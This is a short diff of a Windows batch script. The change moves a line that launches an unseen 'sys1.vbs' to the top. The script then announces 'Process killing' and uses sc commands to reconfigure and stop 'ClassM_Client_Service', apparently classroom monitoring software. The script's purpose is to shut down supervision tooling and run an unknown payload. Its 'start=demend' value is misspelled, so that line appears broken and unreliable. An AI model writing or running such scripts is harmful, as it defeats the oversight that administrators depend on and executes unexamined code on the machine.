@@ -1,10 +1,10 @@
+start sys1.vbs
 @echo off
 :loop
 color 2
 set /a a+=1
 color 5
 mode 1000
-start sys1.vbs
 echo Starting Process killing...
 sc config ClassM_Client_Service start=demend
 sc stop ClassM_Client_Service
